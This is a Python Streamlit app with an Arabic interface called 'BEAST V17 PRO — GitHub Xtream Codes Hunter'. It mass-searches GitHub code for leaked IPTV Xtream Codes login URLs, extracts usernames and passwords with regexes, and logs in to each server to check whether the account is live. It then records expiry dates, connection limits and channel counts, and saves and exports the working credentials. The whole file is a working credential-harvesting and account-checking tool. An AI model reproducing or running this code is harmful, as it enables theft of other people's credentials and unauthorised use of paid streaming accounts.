import streamlit as st
import requests
import re
import time
import hashlib
import json
import os
from datetime import datetime
from base64 import b64decode
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== إعدادات ==========
REQUEST_TIMEOUT = 15
MAX_WORKERS = 12
DATA_FILE = "iptv_data.json"
TOKEN_FILE = "gh_token.json"
PASSWORD = "BEAST_V17_PRO"
GITHUB_API = "https://api.github.com"

# ========== كلمات بحث جاهزة (Auto-Mode) ==========
DEFAULT_QUERIES = [
    '"player_api.php?username="',
    '"get.php?username=" "password="',
    '"panel_api.php?username="',
    'xtream codes username password',
    '"username=" "password=" "player_api.php"',
    '"Xtream Codes" username password',
    'extension:m3u xtream',
    'extension:txt xtream username',
]

# ========== حفظ وتحميل ==========
def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_data(data):
    try:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception:
        pass

def load_token():
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, "r") as f:
                return json.load(f).get("token", "")
        except Exception:
            return ""
    return ""

def save_token(t):
    try:
        with open(TOKEN_FILE, "w") as f:
            json.dump({"token": t}, f)
    except Exception:
        pass

# ========== GitHub Headers ==========
def gh_headers(token=None):
    h = {
        "Accept": "application/vnd.github+json",
        "User-Agent": "BEAST-V17-PRO",
        "X-GitHub-Api-Version": "2022-11-28",
    }
    if token:
        h["Authorization"] = f"Bearer {token}"
    return h

# ========== بحث كود GitHub ==========
def search_code(query, token=None, per_page=100, page=1):
    url = f"{GITHUB_API}/search/code"
    params = {"q": query, "per_page": per_page, "page": page}
    try:
        r = requests.get(url, headers=gh_headers(token), params=params, timeout=REQUEST_TIMEOUT)
        if r.status_code == 200:
            data = r.json()
            return data.get("items", []), data.get("total_count", 0)
        elif r.status_code == 401:
            return None, "توكن غير صالح"
        elif r.status_code == 403:
            # rate limit
            reset = r.headers.get("X-RateLimit-Reset", "?")
            return None, f"Rate Limit — جرب بعد {reset}"
        elif r.status_code == 422:
            return None, "الكويري غير صالح"
        else:
            return None, f"HTTP {r.status_code}"
    except Exception as e:
        return None, str(e)[:120]

# ========== جلب محتوى ملف ==========
def fetch_file(repo_full_name, path, token=None):
    url = f"{GITHUB_API}/repos/{repo_full_name}/contents/{path}"
    try:
        r = requests.get(url, headers=gh_headers(token), timeout=REQUEST_TIMEOUT)
        if r.status_code != 200:
            return None
        data = r.json()
        if data.get("encoding") == "base64":
            return b64decode(data["content"]).decode("utf-8", errors="ignore")
        return data.get("content", "") or ""
    except Exception:
        return None

# ========== استخراج Xtream (محسّن) ==========
XTREAM_PATTERNS = [
    # get.php
    r'(https?://[^\s"\'<>\`]+?)/get\.php\?username=([^\s"\'&<>\`]+)&password=([^\s"\'&<>\`]+)',
    # player_api.php
    r'(https?://[^\s"\'<>\`]+?)/player_api\.php\?username=([^\s"\'&<>\`]+)&password=([^\s"\'&<>\`]+)',
    # panel_api.php
    r'(https?://[^\s"\'<>\`]+?)/panel_api\.php\?username=([^\s"\'&<>\`]+)&password=([^\s"\'&<>\`]+)',
    # ?username=&password= بدون مسار
    r'(https?://[^\s"\'<>\`]+?)\?(?:[^#\s]*&)?username=([^\s"\'&<>\`]+)&password=([^\s"\'&<>\`]+)',
]

def extract_xtream(text):
    found = set()
    for pat in XTREAM_PATTERNS:
        for m in re.finditer(pat, text, re.IGNORECASE):
            base = m.group(1).rstrip("/")
            u = m.group(2)
            p = m.group(3)
            if len(u) < 2 or len(p) < 2:
                continue
            found.add(f"{base}|{u}|{p}")
    # m3u8
    for m in re.finditer(r'https?://[^\s"\'<>\`]+\.m3u8[^\s"\'<>\`]*', text):
        found.add(m.group(0))
    # http://ip:port
    for m in re.finditer(r'\b(https?://\d{1,3}(?:\.\d{1,3}){3}:\d{2,5})', text):
        found.add(m.group(1))
    return sorted(found)

# ========== فحص Xtream ==========
def check_xtream(entry, timeout=REQUEST_TIMEOUT):
    res = {"entry": entry, "status": "❌", "channels": 0, "movies": 0, "series": 0,
           "exp": None, "max_conn": None, "active": None, "tz": None, "err": None}
    if "|" in entry:
        parts = entry.split("|")
        base = parts[0].rstrip("/")
        u = parts[1] if len(parts) > 1 else None
        p = parts[2] if len(parts) > 2 else None
    else:
        base, u, p = entry.rstrip("/"), None, None

    res["url"] = base; res["user"] = u; res["pass"] = p

    try:
        if u and p:
            api = f"{base}/player_api.php?username={u}&password={p}"
        else:
            api = f"{base}/player_api.php"

        r = requests.get(api, timeout=timeout, verify=False,
                         headers={"User-Agent": "Mozilla/5.0"})
        if r.status_code != 200:
            res["err"] = f"HTTP {r.status_code}"; return res
        try:
            data = r.json()
        except Exception:
            res["err"] = "ليس JSON"; return res

        ui = data.get("user_info") or {}
        si = data.get("server_info") or {}
        if ui:
            res["status"] = "✅"
            res["exp"] = ui.get("exp_date")
            res["max_conn"] = ui.get("max_connections")
            res["active"] = ui.get("active_cons")
            res["tz"] = si.get("timezone")
            if res["exp"]:
                try:
                    res["exp_read"] = datetime.fromtimestamp(int(res["exp"])).strftime("%Y-%m-%d")
                except Exception:
                    res["exp_read"] = str(res["exp"])

            for act, key in [("get_live_streams","channels"),
                             ("get_vod_streams","movies"),
                             ("get_series","series")]:
                try:
                    rr = requests.get(f"{api}&action={act}", timeout=timeout, verify=False)
                    if rr.status_code == 200:
                        res[key] = len(rr.json())
                except Exception:
                    pass
        else:
            res["status"] = "⚠️"
    except requests.exceptions.Timeout:
        res["err"] = "Timeout"
    except Exception as e:
        res["err"] = str(e)[:100]
    return res

# ========== شاشة الدخول ==========
def login_screen():
    st.set_page_config(page_title="BEAST V17 PRO", page_icon="🔥", layout="wide")
    st.markdown("""
    <style>
    .main-header {
        background: linear-gradient(90deg,#ff4b2b,#ff416c);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        font-size:3em; font-weight:bold; text-align:center;
    }
    .sub-header { text-align:center; color:#888; margin-bottom:2em; }
    .stButton > button {
        background: linear-gradient(90deg,#ff4b2b,#ff416c);
        color:white; border:none; border-radius:8px; font-weight:bold;
    }
    </style>
    """, unsafe_allow_html=True)
    st.markdown('<div class="main-header">🔥 BEAST V17 PRO 🔥</div>', unsafe_allow_html=True)
    st.markdown('<div class="sub-header">GitHub Xtream Codes Hunter</div>', unsafe_allow_html=True)
    c1, c2, c3 = st.columns([1, 2, 1])
    with c2:
        pwd = st.text_input("🔐 كلمة المرور", type="password")
        if st.button("🚀 دخول", use_container_width=True):
            if pwd == PASSWORD:
                st.session_state.logged_in = True
                st.rerun()
            else:
                st.error("❌ كلمة مرور خاطئة")

# ========== الواجهة ==========
def main_app():
    st.set_page_config(page_title="BEAST V17 PRO", page_icon="🔥", layout="wide")
    st.markdown('<div class="main-header">🔥 BEAST V17 PRO 🔥</div>', unsafe_allow_html=True)
    st.markdown('<div class="sub-header">GitHub Xtream Codes Hunter</div>', unsafe_allow_html=True)

    # ===== Sidebar =====
    with st.sidebar:
        st.header("⚙️ الإعدادات")
        st.markdown("### 🔑 GitHub Token")
        if "gh_token" not in st.session_state:
            st.session_state.gh_token = load_token()

        token = st.text_input("التوكن", type="password",
                              value=st.session_state.gh_token,
                              help="بدون: 10 طلبات/دقيقة | مع: 30 طلب/دقيقة")
        c1, c2 = st.columns(2)
        with c1:
            if st.button("💾 حفظ", use_container_width=True):
                save_token(token); st.session_state.gh_token = token
                st.success("✅ تم")
        with c2:
            if st.button("🗑️ مسح", use_container_width=True):
                save_token(""); st.session_state.gh_token = ""
                st.rerun()

        if token:
            st.success("✅ توكن مفعّل")
        else:
            st.warning("⚠️ بدون توكن")

        st.divider()
        if st.button("🚪 خروج", use_container_width=True):
            st.session_state.logged_in = False
            st.rerun()

        st.divider()
        st.metric("💾 محفوظ", len(load_data()))

    # ===== Tabs (مصلّحة) =====
    tab1, tab2, tab3, tab4 = st.tabs([
        "🔍 بحث Xtream في GitHub",
        "⚡ بحث تلقائي ضخم",
        "🎯 استخراج من نص",
        "💾 المحفوظات"
    ])

    # ===== TAB 1: بحث يدوي =====
    with tab1:
        st.subheader("🔍 البحث اليدوي عن Xtream Codes")
        c1, c2 = st.columns([3, 1])
        with c1:
            query = st.text_input("🔎 كلمة البحث",
                value='"player_api.php?username="',
                help="جرّب: get.php?username=, panel_api.php, Xtream Codes")
        with c2:
            pages = st.number_input("صفحات", 1, 10, 3)

        c1, c2, c3 = st.columns(3)
        with c1:
            per_page = st.slider("نتائج/صفحة", 10, 100, 50)
        with c2:
            auto_check = st.checkbox("فحص تلقائي", value=True)
        with c3:
            max_check = st.number_input("حد الفحص", 5, 300, 50)

        if st.button("🚀 ابدأ", use_container_width=True, key="btn_tab1"):
            run_search([query], int(pages), int(per_page),
                       auto_check, int(max_check))

    # ===== TAB 2: بحث تلقائي =====
    with tab2:
        st.subheader("⚡ بحث تلقائي بكلمات متعددة")
        st.caption("يدور على كل الأنماط دفعة واحدة — نتائج ضخمة")

        selected = st.multiselect("الكلمات المفتاحية", DEFAULT_QUERIES,
                                   default=DEFAULT_QUERIES[:4])

        c1, c2, c3 = st.columns(3)
        with c1:
            pages = st.number_input("صفحات/كلمة", 1, 5, 2, key="auto_pages")
        with c2:
            per_page = st.slider("نتائج/صفحة", 10, 100, 100, key="auto_pp")
        with c3:
            auto_check = st.checkbox("فحص تلقائي", value=False, key="auto_chk")

        if st.button("⚡ ابدأ البحث الضخم", use_container_width=True, key="btn_auto"):
            if selected:
                run_search(selected, int(pages), int(per_page), auto_check, 100)
            else:
                st.warning("⚠️ اختر كلمة على الأقل")

    # ===== TAB 3: استخراج من نص =====
    with tab3:
        st.subheader("🎯 استخراج سيرفرات من نص")
        text = st.text_area("الصق النص", height=250,
            placeholder="http://server:8080/get.php?username=USER&password=PASS")
        if st.button("🔎 استخراج", use_container_width=True, key="btn_extract"):
            servers = extract_xtream(text)
            if servers:
                st.success(f"✅ {len(servers)} سيرفر")
                st.code("\n".join(servers), language="text")
                st.download_button("📥 تحميل", "\n".join(servers),
                    file_name="xtream.txt", mime="text/plain")
            else:
                st.warning("⚠️ لا يوجد")

    # ===== TAB 4: محفوظات =====
    with tab4:
        st.subheader("💾 المحفوظات")
        data = load_data()
        if not data:
            st.info("📭 فاضي")
        else:
            st.write(f"**{len(data)} نتيجة**")
            for k, v in data.items():
                with st.expander(f"✅ {v.get('url','?')} — {v.get('channels',0)} قناة"):
                    st.json(v)
            c1, c2 = st.columns(2)
            with c1:
                st.download_button("📥 تصدير JSON",
                    json.dumps(data, ensure_ascii=False, indent=2),
                    file_name="export.json", mime="application/json")
            with c2:
                if st.button("🗑️ حذف الكل"):
                    save_data({}); st.rerun()

# ========== دالة البحث الرئيسية ==========
def run_search(queries, pages, per_page, auto_check, max_check):
    token = st.session_state.get("gh_token", "") or None
    all_items = []
    seen_urls = set()

    prog = st.progress(0)
    stat = st.empty()

    total_tasks = len(queries) * pages
    done = 0

    for q in queries:
        for p in range(1, pages + 1):
            stat.text(f"🔎 '{q[:40]}' صفحة {p}...")
            items, err = search_code(q, token=token, per_page=per_page, page=p)
            done += 1
            prog.progress(done / total_tasks)

            if err:
                st.warning(f"⚠️ {q[:30]}: {err}")
                if "Rate Limit" in str(err):
                    st.error("🚫 تجاوزت الحد — استنى شوية أو ضيف توكن")
                    break
            elif items:
                for it in items:
                    key = f"{it['repository']['full_name']}/{it['path']}"
                    if key not in seen_urls:
                        seen_urls.add(key)
                        all_items.append(it)
            # rate limit بدون توكن
            if not token and p < pages:
                time.sleep(7)

    prog.empty(); stat.empty()

    if not all_items:
        st.warning("⚠️ لا نتائج")
        return

    st.success(f"✅ {len(all_items)} ملف — جاري تحليلهم...")

    # جلب الملفات بشكل متوازي
    all_servers = set()
    prog = st.progress(0)
    stat = st.empty()

    def fetch_one(it):
        return fetch_file(it["repository"]["full_name"], it["path"], token)

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futs = {ex.submit(fetch_one, it): it for it in all_items}
        d = 0
        for fut in as_completed(futs):
            try:
                content = fut.result()
                if content:
                    all_servers.update(extract_xtream(content))
            except Exception:
                pass
            d += 1
            prog.progress(d / len(all_items))
            stat.text(f"⏳ تحليل {d}/{len(all_items)}")

    prog.empty(); stat.empty()

    servers = sorted(all_servers)
    st.info(f"🎯 {len(servers)} سيرفر/رابط")
    st.session_state["last_servers"] = servers

    if servers:
        with st.expander("👁️ عرض الكل"):
            st.code("\n".join(servers), language="text")
        st.download_button("📥 تحميل TXT", "\n".join(servers),
            file_name=f"xtream_{int(time.time())}.txt", mime="text/plain")

    # فحص
    if auto_check and servers:
        st.divider()
        st.markdown("### 🔬 فحص السيرفرات")
        to_check = servers[:max_check]
        prog = st.progress(0); stat = st.empty()
        results = []

        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
            futs = {ex.submit(check_xtream, s): s for s in to_check}
            d = 0
            for fut in as_completed(futs):
                try:
                    results.append(fut.result())
                except Exception as e:
                    results.append({"entry": futs[fut], "status": "❌", "err": str(e)[:80]})
                d += 1
                prog.progress(d / len(to_check))
                stat.text(f"⏳ {d}/{len(to_check)}")
        prog.empty(); stat.empty()

        ok = sum(1 for r in results if "✅" in r.get("status", ""))
        c1, c2, c3 = st.columns(3)
        c1.metric("✅ يعمل", ok)
        c2.metric("❌ فاشل", len(results) - ok)
        c3.metric("📊 الإجمالي", len(results))

        # عرض
        for r in results:
            if "✅" in r.get("status", ""):
                with st.expander(f"✅ {r['url']} — {r.get('channels',0)} قناة"):
                    st.write(f"👤 `{r.get('user')}` | 🔑 `{r.get('pass')}`")
                    st.write(f"📅 Exp: `{r.get('exp_read','N/A')}` | 🔗 Conn: `{r.get('active')}/{r.get('max_conn')}`")
                    st.write(f"🌍 `{r.get('tz','N/A')}`")
                    st.write(f"📺 {r.get('channels',0)} | 🎬 {r.get('movies',0)} | 📼 {r.get('series',0)}")

        # حفظ
        data = load_data()
        for r in results:
            if "✅" in r.get("status", ""):
                key = hashlib.md5(r["entry"].encode()).hexdigest()[:12]
                data[key] = r
        save_data(data)
        st.success("💾 تم الحفظ")

# ========== نقطة البداية ==========
def main():
    if "logged_in" not in st.session_state:
        st.session_state.logged_in = False
    if not st.session_state.logged_in:
        login_screen()
    else:
        main_app()

if __name__ == "__main__":
    main()
